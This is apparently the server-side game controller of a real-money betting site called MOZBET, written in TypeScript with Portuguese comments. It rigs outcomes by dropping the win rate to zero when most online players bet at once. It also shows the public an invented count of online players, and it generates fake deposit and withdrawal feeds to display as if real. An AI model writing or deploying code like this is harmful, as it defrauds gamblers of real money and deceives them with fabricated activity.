// Controlador Central de Jogos — MOZBET
// Este módulo decide server-side se um jogador ganha ou perde
// baseado na proporção de apostas ativas vs jogadores online.
// NUNCA importar no frontend!

import { supabaseAdmin } from "@/lib/auth-server";
import crypto from "crypto";

// ==========================================
// CONFIGURAÇÃO DO CONTROLADOR
// ==========================================

export const CONTROLLER_CONFIG = {
  // Janela de tempo para contar apostas "simultâneas" (ms)
  BET_WINDOW: 30 * 1000, // 30 segundos

  // Proporções de vitória baseadas na carga de apostas
  // Se TODOS apostarem (ratio >= 0.9) → 0% ganham (todos perdem)
  // Se mais de metade apostar (ratio >= 0.5) → 20% ganham
  // Se menos de metade apostar (ratio < 0.5) → 40% ganham
  WIN_RATES: {
    ALL_BETTING: 0.0,       // ratio >= 0.9
    MAJORITY_BETTING: 0.20, // 0.5 <= ratio < 0.9
    MINORITY_BETTING: 0.40, // ratio < 0.5
  },

  // Aposta mínima e máxima global (MZN)
  MIN_BET: 1,
  MAX_BET: 50000,
};

// ==========================================
// RASTREIO DE PRESENÇA (Jogadores Online)
// ==========================================
// Mapa em memória de jogadores ativos (userId → timestamp do último heartbeat)
// Em produção, isto iria para Redis ou Supabase Presence
const activePresence = new Map<string, number>();

// Registar heartbeat de presença (chamado periodicamente pelo frontend)
export function registerPresence(userId: string): void {
  activePresence.set(userId, Date.now());
}

// Obter contagem real de jogadores online (privado — só backend/admin)
// Busca dinamicamente o número de conexões Socket.io ativas na VPS
export async function getRealOnlineCount(): Promise<number> {
  try {
    const vpsUrl = process.env.VPS_SOCKET_URL || "http://155.248.224.133:3001";
    const res = await fetch(`${vpsUrl}/api/online-count`, {
      cache: "no-store",
      signal: AbortSignal.timeout(2000), // Timeout curto para resiliência das lambdas
    });
    if (res.ok) {
      const data = await res.json();
      return Math.max(1, data.count || 1);
    }
  } catch (err) {
    console.error("[Presence] Erro ao buscar contagem de online da VPS:", err);
  }
  
  // Fallback seguro em produção/dev para evitar erro de divisão por zero ou winrate zerado
  return 150; 
}

// Gerar contagem FAKE de jogadores online (público — frontend)
export function getFakeOnlineCount(): number {
  const now = new Date();
  const hour = now.getHours();
  const minute = now.getMinutes();
  
  // Seed baseada no dia, hora e minuto (para garantir o mesmo número globalmente no mesmo minuto)
  const seed = (now.getDate() * 24 * 60) + (hour * 60) + minute;
  
  let rangeMin = 80;
  let rangeMax = 150;

  // Horários de pico (almoço e noite)
  if ((hour >= 11 && hour <= 14) || (hour >= 18 && hour <= 23)) {
    rangeMin = 350;
    rangeMax = 580;
  } else if (hour >= 2 && hour <= 6) {
    // Madrugada
    rangeMin = 40;
    rangeMax = 90;
  } else {
    // Horário normal
    rangeMin = 150;
    rangeMax = 280;
  }

  // Variação "aleatória" mas determinística para o mesmo minuto
  const pseudoRandom = Math.abs(Math.sin(seed * 9999));
  
  return Math.floor(rangeMin + pseudoRandom * (rangeMax - rangeMin));
}

// ==========================================
// RASTREIO DE APOSTAS ATIVAS
// ==========================================
// Mapa de apostas recentes: userId → timestamp da última aposta
const recentBets = new Map<string, number>();

// Registar que um jogador fez uma aposta
export function registerBet(userId: string): void {
  recentBets.set(userId, Date.now());
}

// Contar quantos jogadores apostaram na janela de tempo
function getActiveBettorsCount(): number {
  const now = Date.now();
  let count = 0;
  for (const [userId, betTime] of recentBets.entries()) {
    if (now - betTime < CONTROLLER_CONFIG.BET_WINDOW) {
      count++;
    } else {
      recentBets.delete(userId);
    }
  }
  return count;
}

// ==========================================
// ALGORITMO DE DECISÃO: GANHA OU PERDE?
// ==========================================

export async function shouldPlayerWin(userId: string): Promise<boolean> {
  // 1. Registar esta aposta
  registerBet(userId);

  // 2. Calcular a proporção
  const onlineCount = await getRealOnlineCount();
  const bettorsCount = getActiveBettorsCount();
  const ratio = bettorsCount / onlineCount;

  // 3. Determinar a taxa de vitória baseada na proporção
  let winRate: number;
  if (ratio >= 0.9) {
    // Quase todos estão a apostar → todos perdem
    winRate = CONTROLLER_CONFIG.WIN_RATES.ALL_BETTING;
  } else if (ratio >= 0.5) {
    // Mais de metade a apostar → poucos ganham
    winRate = CONTROLLER_CONFIG.WIN_RATES.MAJORITY_BETTING;
  } else {
    // Menos de metade → taxa normal de vitória
    winRate = CONTROLLER_CONFIG.WIN_RATES.MINORITY_BETTING;
  }

  // 4. Decisão criptograficamente aleatória
  const randomValue = crypto.randomBytes(4).readUInt32BE(0) / 0xFFFFFFFF;
  const wins = randomValue < winRate;

  if (process.env.NODE_ENV !== "production") {
    console.log(
      `[GameController] User=${userId.slice(0, 8)} | Online=${onlineCount} | Bettors=${bettorsCount} | Ratio=${(ratio * 100).toFixed(0)}% | WinRate=${(winRate * 100).toFixed(0)}% | Result=${wins ? "WIN" : "LOSS"}`
    );
  }

  return wins;
}

// ==========================================
// GERAÇÃO DE DADOS FAKE PARA EXIBIÇÃO
// ==========================================

// Gerar lista de entradas/depósitos fake
export function generateFakeDeposits(count: number = 5): Array<{ id: string; amount: number; time: string }> {
  const results = [];
  const chars = "ABCDEF0123456789";
  for (let i = 0; i < count; i++) {
    let fakeId = "";
    for (let j = 0; j < 4; j++) fakeId += chars[Math.floor(Math.random() * chars.length)];
    fakeId += "***";

    results.push({
      id: fakeId,
      amount: [50, 100, 200, 500, 1000, 1500, 2000, 3000, 5000][Math.floor(Math.random() * 9)],
      time: `${Math.floor(Math.random() * 5) + 1}min`,
    });
  }
  return results;
}

// Gerar lista de retiradas/saques fake
export function generateFakeWithdrawals(count: number = 5): Array<{ id: string; amount: number; game: string; time: string }> {
  const games = ["Aviator", "Mines", "Plinko", "Taxi Crash", "Lion Zama", "Mega Fruits"];
  const results = [];
  const chars = "ABCDEF0123456789";
  for (let i = 0; i < count; i++) {
    let fakeId = "";
    for (let j = 0; j < 4; j++) fakeId += chars[Math.floor(Math.random() * chars.length)];
    fakeId += "***";

    results.push({
      id: fakeId,
      amount: [200, 500, 1000, 2000, 3500, 5000, 7500, 10000, 15000, 20000][Math.floor(Math.random() * 10)],
      game: games[Math.floor(Math.random() * games.length)],
      time: `${Math.floor(Math.random() * 10) + 1}min`,
    });
  }
  return results;
}

// ==========================================
// VALIDAÇÕES COMUNS
// ==========================================

export async function validateBet(userId: string, amount: number): Promise<{ valid: boolean; error?: string; balance?: number }> {
  if (!amount || typeof amount !== "number" || amount < CONTROLLER_CONFIG.MIN_BET || amount > CONTROLLER_CONFIG.MAX_BET) {
    return { valid: false, error: `Aposta deve ser entre ${CONTROLLER_CONFIG.MIN_BET} e ${CONTROLLER_CONFIG.MAX_BET} MZN` };
  }

  const { data: user, error } = await supabaseAdmin
    .from("users")
    .select("balance, bonus_balance")
    .eq("id", userId)
    .single();

  if (error || !user) {
    return { valid: false, error: "Utilizador não encontrado" };
  }

  const currentBalance = Number(user.balance || 0);
  const currentBonus = Number(user.bonus_balance || 0);
  const totalPower = currentBalance + currentBonus;

  if (totalPower < amount) {
    return { valid: false, error: "Saldo insuficiente" };
  }

  return { valid: true, balance: totalPower };
}

// Descontar saldo de forma inteligente (Bónus Primeiro)
export async function deductBalance(userId: string, _dummyCurrent: number, amount: number): Promise<number> {
  const { data: user } = await supabaseAdmin
    .from("users")
    .select("balance, bonus_balance")
    .eq("id", userId)
    .single();

  if (!user) throw new Error("Usuário não encontrado");

  let newBalance = Number(user.balance || 0);
  let newBonus = Number(user.bonus_balance || 0);
  let remainingAmount = amount;

  // 1. Tentar gastar do Bónus primeiro
  if (newBonus > 0) {
    if (newBonus >= remainingAmount) {
      newBonus -= remainingAmount;
      remainingAmount = 0;
    } else {
      remainingAmount -= newBonus;
      newBonus = 0;
    }
  }

  // 2. Gastar o restante da Carteira Principal
  if (remainingAmount > 0) {
    newBalance -= remainingAmount;
  }

  newBalance = Math.max(0, parseFloat(newBalance.toFixed(2)));
  newBonus = Math.max(0, parseFloat(newBonus.toFixed(2)));

  await supabaseAdmin
    .from("users")
    .update({ balance: newBalance, bonus_balance: newBonus })
    .eq("id", userId);
    
  return newBalance + newBonus;
}

// Creditar saldo (Os ganhos vão SEMPRE para a carteira principal)
export async function creditBalance(userId: string, amount: number): Promise<number> {
  const { data: user } = await supabaseAdmin
    .from("users")
    .select("balance, bonus_balance")
    .eq("id", userId)
    .single();

  const currentBalance = Number(user?.balance || 0);
  const currentBonus = Number(user?.bonus_balance || 0);
  
  const newBalance = parseFloat((currentBalance + amount).toFixed(2));
  
  await supabaseAdmin
    .from("users")
    .update({ balance: newBalance })
    .eq("id", userId);
    
  return newBalance + currentBonus;
}
